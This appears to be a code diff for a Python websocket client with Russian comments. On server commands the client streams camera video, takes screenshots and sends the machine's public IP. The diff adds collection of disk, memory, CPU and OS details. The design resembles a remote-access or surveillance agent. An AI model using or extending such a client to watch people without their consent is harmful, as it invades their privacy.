@@ -6,6 +6,9 @@ import threading
 from mss import mss  # Для захвата скриншотов
 from mss.tools import to_png  # Для конвертации в PNG
 import websocket  # pip install websocket-client
+import psutil       # Для получения системных метрик
+import platform     # Для информации о процессоре и ОС
+import json         # Для сериализации данных в JSON
 
 # Настройка логирования
 logging.basicConfig(
@@ -41,6 +44,39 @@ def send_ip_via_ws(ws):
     except Exception as e:
         logger.error(f"Ошибка получения или отправки публичного IP: {e}")
 
+def collect_and_send_metrics(ws):
+    """
+    Собирает метрики системы (дисковое пространство, оперативную память, процессор, ОС)
+    и отправляет их на сервер в формате JSON.
+    """
+    metrics = {}
+    try:
+        # Получаем данные по дисковому пространству для системного диска (обычно C:\)
+        disk_usage = psutil.disk_usage("C:\\")
+        metrics["disk_total"] = disk_usage.total
+        metrics["disk_free"] = disk_usage.free
+
+        # Получаем данные по оперативной памяти
+        mem = psutil.virtual_memory()
+        metrics["memory_total"] = mem.total
+        metrics["memory_available"] = mem.available
+
+        # Тип процессора
+        metrics["processor"] = platform.processor()
+
+        # Операционная система
+        metrics["os"] = f"{platform.system()} {platform.release()}"
+    except Exception as e:
+        logger.error(f"Ошибка сбора метрик: {e}")
+        metrics["error"] = str(e)
+
+    try:
+        # Отправляем метрики на сервер
+        ws.send(json.dumps({"command": "metrics", "data": metrics}))
+        logger.info("Метрики отправлены на сервер")
+    except Exception as e:
+        logger.error(f"Ошибка отправки метрик: {e}")
+
 def capture_and_send_video():
     """
     Захват видео и скриншотов.
@@ -48,7 +84,7 @@ def capture_and_send_video():
     При выключении трансляции камера закрывается, чтобы не нагружать систему.
     """
     camera = None
-    
+
     while True:
         if streaming_active:
             if camera is None:
@@ -133,6 +169,8 @@ def control_ws():
             send_ip_via_ws(ws)
         elif cmd == "screenshot":
             takeScreenshot()
+        elif cmd == "metrics":
+            collect_and_send_metrics(ws)
 
     def on_error(ws, error):
         logger.error(f"WebSocket ошибка: {error}")
